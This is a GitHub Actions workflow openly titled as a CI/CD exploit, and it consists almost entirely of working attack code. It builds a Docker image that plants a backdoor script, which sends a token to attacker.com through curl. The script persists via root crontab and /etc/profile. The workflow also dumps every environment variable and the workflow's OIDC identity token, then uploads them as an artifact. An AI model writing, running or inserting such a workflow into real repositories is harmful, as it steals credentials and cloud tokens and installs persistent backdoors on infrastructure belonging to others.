name: Critical CI/CD Exploit  
on:  
  push:  
    branches: [ main ]  
jobs:  
  attack:  
    runs-on: ubuntu-latest  
    permissions:  
      id-token: write  
      contents: read  
    steps:  
      - name: Checkout Repository  
        uses: actions/checkout@v4  

      - name: Execute Payload  
        run: |  
          mkdir -p ./taskcluster/docker/python  
          cat <<EOF > ./taskcluster/docker/python/Dockerfile  
          FROM python:3.11-alpine  
          ARG PYTHON_VERSION  
          RUN apk add --no-cache curl && \  
              echo "[+] Installing backdoor..." && \  
              echo '#!/bin/sh' > /usr/local/bin/init.sh && \  
              echo 'curl -s http://attacker.com/exfil?token=\$(cat /token)' >> /usr/local/bin/init.sh && \  
              chmod +x /usr/local/bin/init.sh && \  
              echo "@reboot /usr/local/bin/init.sh" >> /etc/crontabs/root && \  
              echo "/usr/local/bin/init.sh" >> /etc/profile && \  
              echo "[+] Dumping secrets..." && \  
              { echo "===== ENV ====="; printenv; echo "===== OIDC TOKEN ====="; curl -H "Authorization: bearer \$ACTIONS_ID_TOKEN_REQUEST_TOKEN" "\$ACTIONS_ID_TOKEN_REQUEST_URL"; } > /leaks.txt  
          EOF  

          PAYLOAD=$(cat <<'EOF'  
          echo "Triggering exploit..."  
          EOF  
          )  

          docker build \  
            --build-arg PYTHON_VERSION="$PAYLOAD" \  
            -t malicious \  
            ./taskcluster/docker/python  

          docker run --rm malicious cat /leaks.txt > leaks.txt  

      - name: Upload Exfiltrated Data  
        uses: actions/upload-artifact@v4  
        with:  
          name: ci-leaks  
          path: leaks.txt  
